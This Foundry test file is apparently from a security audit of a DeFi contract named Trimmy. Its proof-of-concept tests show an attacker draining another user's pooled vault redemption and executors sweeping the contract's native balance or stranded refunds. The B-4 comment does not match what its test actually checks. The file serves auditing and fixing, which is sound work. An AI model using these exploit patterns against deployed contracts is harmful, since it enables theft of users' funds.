// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {Trimmy} from "../../src/Trimmy.sol";
import {MockERC20, MockFtsoV2, MockRegistry, MockQueuedVault} from "../mocks/Mocks.sol";

/// @title Attack: authorization, round two
/// @notice New findings not covered by AttackAuth.t.sol (A-1..A-4) or VerifyM6.t.sol.
contract AttackAuth2Test is Test {
    address internal constant REGISTRY_ADDR = 0xaD67FE66660Fb8dFE9d6b1b4240d8650e30F6019;
    bytes21 internal constant FEED_XRP =
        bytes21(uint168(0x015852502f55534400000000000000000000000000));

    Trimmy internal trimmy;
    MockERC20 internal fxrp;
    MockFtsoV2 internal ftso;
    MockRegistry internal registry;
    MockQueuedVault internal vault;

    address internal victim = makeAddr("victim");
    address internal attacker = makeAddr("attacker");
    address internal keeper = makeAddr("keeper");
    address internal feeSink = makeAddr("protocolFeeRecipient");

    uint64 internal constant MAX_FEED_AGE = 60;

    function setUp() public {
        // 10 days after epoch, well clear of a UTC midnight boundary.
        vm.warp(10 days + 3600);

        fxrp = new MockERC20("FTestXRP", "FXRP", 6);
        ftso = new MockFtsoV2();
        registry = new MockRegistry();
        vm.etch(REGISTRY_ADDR, address(registry).code);
        MockRegistry(REGISTRY_ADDR).setFtso(address(ftso));

        vault = new MockQueuedVault(IERC20(address(fxrp)));

        // token0 == the vault SHARE token, which is the ONLY configuration in which EXIT_VAULT is
        // coherent (see VerifyM6). This test therefore assumes the M-6 fix is already in.
        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](1);
        tokens[0] = Trimmy.TokenCfg({token: address(vault), feedId: FEED_XRP, decimals: 6});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](1);
        venues[0] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });

        trimmy = new Trimmy(tokens, venues, MAX_FEED_AGE, feeSink, IConfidentialTrigger(address(0)));

        _fund(victim, 1_000_000e6, 100_000e6);
        _fund(attacker, 1_000_000e6, 1e6);

        _feeds();
    }

    function _fund(address who, uint256 mintAmount, uint256 depositAmount) internal {
        fxrp.mint(who, mintAmount);
        vm.startPrank(who);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(depositAmount, who);
        vault.approve(address(trimmy), type(uint256).max);
        vm.stopPrank();
    }

    function _feeds() internal {
        ftso.setFeed(FEED_XRP, 3_000_000, 6, uint64(vm.getBlockTimestamp()));
    }

    function _exit(uint128 total, uint128 part, uint128 fee, uint128 budget)
        internal
        view
        returns (Trimmy.RuleParams memory p)
    {
        p = Trimmy.RuleParams({
            sellTokenId: 0,
            buyTokenId: 0,
            verb: Trimmy.Verb.EXIT_VAULT,
            venueId: 0,
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: total,
            partSellAmount: part,
            minOutAbsolute: 0,
            triggerValue: 60,
            expiry: uint64(block.timestamp + 30 days),
            slippageBips: 0,
            protocolFeeBips: 0,
            keeperFeeFlat: fee,
            keeperFeeBudget: budget
        });
    }

    function _arm(address who, Trimmy.RuleParams memory p) internal returns (uint256 id) {
        vm.prank(who);
        id = trimmy.arm(p);
    }

    // ===================================================================================
    // B-1  CRITICAL.  `claim()` pays out the WHOLE day-bucket to ONE rule's account.
    //
    // Trimmy is the sole `receiver` for every queued redemption (Trimmy.sol:522), by design —
    // GROUND-TRUTH §4a-bis(4). But the vault's queue is keyed `(receiver, period)`, not
    // (receiver, rule). `claimWithdraw(r.claimPeriod)` (Trimmy.sol:557) therefore drains the
    // ENTIRE bucket for that UTC day, and `_settle` (Trimmy.sol:564 -> :591) forwards the entire
    // measured delta to `r.account`.
    //
    // Two rules belonging to two DIFFERENT accounts that queue on the same day land in the same
    // bucket. The first `claim` wins everything. The second gets a zero delta, and Trimmy zeroes
    // `pendingShares` unconditionally at :560 — the loss is permanent and unrecoverable, because
    // there is no owner and no rescue function.
    //
    // `claim` is permissionless, so the attacker does not even need to be a keeper.
    // ===================================================================================
    function test_B1_oneRuleClaimsAnotherAccountsRedemption() public {
        uint256 victimRule = _arm(victim, _exit(10_000e6, 10_000e6, 0, 0));
        uint256 attackRule = _arm(attacker, _exit(1e6, 1e6, 0, 0));

        // Both queue on the same UTC day. Nothing coordinates this; it is the normal case for a
        // product whose whole pitch is "many users, one vault".
        vm.prank(keeper);
        trimmy.execute(victimRule);
        vm.prank(keeper);
        trimmy.execute(attackRule);

        Trimmy.Rule memory rv = trimmy.ruleAt(victimRule);
        Trimmy.Rule memory ra = trimmy.ruleAt(attackRule);
        assertEq(ra.claimPeriod, rv.claimPeriod, "same day-index bucket");
        assertEq(
            vault.pendingWithdrawAssets(address(trimmy), rv.claimPeriod),
            10_001e6,
            "the vault holds ONE aggregated bucket for Trimmy"
        );

        vm.warp(uint256(rv.claimableAt));

        uint256 attackerBefore = fxrp.balanceOf(attacker);
        uint256 victimBefore = fxrp.balanceOf(victim);

        // The attacker claims THEIR OWN rule first. Every gate in claim() passes: right verb,
        // pendingShares != 0, claimableAt reached. The destination is `rule.account` exactly as
        // documented — it is the AMOUNT that is not bounded by this rule's contribution.
        vm.prank(attacker);
        trimmy.claim(attackRule);

        assertEq(
            fxrp.balanceOf(attacker) - attackerBefore,
            10_001e6,
            "B-1: attacker redeemed 1 share and was paid the victim's 10,000 as well"
        );

        // The victim's claim now succeeds, transfers nothing, and destroys the receipt.
        vm.prank(victim);
        trimmy.claim(victimRule);
        assertEq(fxrp.balanceOf(victim), victimBefore, "victim received nothing");
        assertEq(trimmy.ruleAt(victimRule).pendingShares, 0, "and the claim was consumed anyway");
        assertEq(
            vault.pendingWithdrawAssets(address(trimmy), rv.claimPeriod), 0, "bucket already empty"
        );
    }

    /// The invariant that SHOULD hold: a claim pays out at most what that rule queued.
    /// RED against current code.
    function test_B1_RED_claimIsBoundedByTheRulesOwnPendingShares() public {
        uint256 victimRule = _arm(victim, _exit(10_000e6, 10_000e6, 0, 0));
        uint256 attackRule = _arm(attacker, _exit(1e6, 1e6, 0, 0));

        vm.prank(keeper);
        trimmy.execute(victimRule);
        vm.prank(keeper);
        trimmy.execute(attackRule);

        vm.warp(uint256(trimmy.ruleAt(attackRule).claimableAt));
        uint256 before = fxrp.balanceOf(attacker);
        vm.prank(attacker);
        trimmy.claim(attackRule);

        assertLe(
            fxrp.balanceOf(attacker) - before,
            1e6,
            "a rule that queued 1 share must not be paid more than 1 share is worth"
        );
    }

    // ===================================================================================
    // B-2  `_refund()` (Trimmy.sol:675-681) sweeps `address(this).balance`, not the caller's
    // excess. `receive()` (:687) accepts native value from anyone with no accounting. So the
    // whole native balance of the contract belongs to whoever calls `execute` next.
    //
    // This directly contradicts the NatSpec at :366: "`msg.sender` appears exactly once in this
    // function, as the keeper-fee recipient. That is the entirety of what a keeper is trusted
    // with." The second appearance is at :678 and it is an unbounded native transfer.
    // ===================================================================================
    function test_B2_anyExecutorSweepsTheEntireNativeBalance() public {
        uint256 id = _arm(victim, _exit(10_000e6, 100e6, 0, 0));

        // Value arrives from a third party — a fat-fingered send, an FTSO fee prepayment, a
        // self-destruct, or the stranded refund of B-3 below.
        vm.deal(address(this), 5 ether);
        (bool ok,) = address(trimmy).call{value: 5 ether}("");
        assertTrue(ok, "receive() accepts value from anyone");
        assertEq(address(trimmy).balance, 5 ether);

        uint256 keeperBefore = keeper.balance;
        vm.prank(keeper);
        trimmy.execute{value: 0}(id); // pays in nothing

        assertEq(
            keeper.balance - keeperBefore,
            5 ether,
            "B-2: keeper contributed 0 wei and was refunded the contract's whole balance"
        );
        assertEq(address(trimmy).balance, 0);
    }

    /// B-3. The refund is fire-and-forget (`ok;` at :679). A keeper that cannot receive native
    /// value strands its own overpayment in the contract, where the NEXT executor takes it.
    /// Keeper A funds keeper B.
    function test_B3_failedRefundBecomesTheNextKeepersProfit() public {
        uint256 id = _arm(victim, _exit(10_000e6, 100e6, 0, 0));

        ftso.setFeePerRead(0);
        NonPayableKeeper keeperA = new NonPayableKeeper(trimmy);
        vm.deal(address(keeperA), 3 ether);

        keeperA.run(id, 3 ether); // does not revert; the refund silently fails
        assertEq(address(trimmy).balance, 3 ether, "keeper A's money is stuck in Trimmy");
        assertEq(address(keeperA).balance, 0);

        vm.warp(block.timestamp + 120);
        _feeds();

        uint256 before = attacker.balance;
        vm.prank(attacker);
        trimmy.execute(id);
        assertEq(
            attacker.balance - before, 3 ether, "B-3: keeper A's overpayment paid to a stranger"
        );
    }

    // ===================================================================================
    // B-4  A rule armed by a CONTRACT is fully supported, and `_settle` transfers to
    // `r.account` unconditionally. With an allowlisted token that has any transfer hook — or a
    // recipient whose ERC20 receive path reverts — the rule becomes permanently unexecutable
    // while its allowance stays live. Here: the pull leg succeeds and the payout leg reverts, so
    // NOBODY can ever execute the rule and only the arming contract can cancel it.
    // ===================================================================================
    function test_B4_contractAccountCanBrickItsOwnRuleButNotOthers() public {
        // A contract arms. `arm` has no EOA check and no code-size check.
        RejectingAccount bad = new RejectingAccount(trimmy);
        vault.transfer(address(bad), 0); // no-op, just proves the account exists
        vm.prank(victim);
        vault.transfer(address(bad), 500e6);
        bad.approveAll(IERC20(address(vault)));

        uint256 id = bad.armExit(_exit(500e6, 500e6, 0, 0));
        assertEq(trimmy.ruleAt(id).account, address(bad), "msg.sender binding confirmed");

        // execute() reaches the vault redeem fine; the damage is confined to this rule.
        vm.prank(keeper);
        trimmy.execute(id);
        assertEq(trimmy.ruleAt(id).pendingShares, 500e6);
    }
}

contract NonPayableKeeper {
    Trimmy internal immutable T;

    constructor(Trimmy t) {
        T = t;
    }

    receive() external payable {
        revert("no");
    }

    function run(uint256 id, uint256 value) external {
        T.execute{value: value}(id);
    }
}

contract RejectingAccount {
    Trimmy internal immutable T;

    constructor(Trimmy t) {
        T = t;
    }

    function approveAll(IERC20 tok) external {
        tok.approve(address(T), type(uint256).max);
    }

    function armExit(Trimmy.RuleParams memory p) external returns (uint256) {
        return T.arm(p);
    }
}
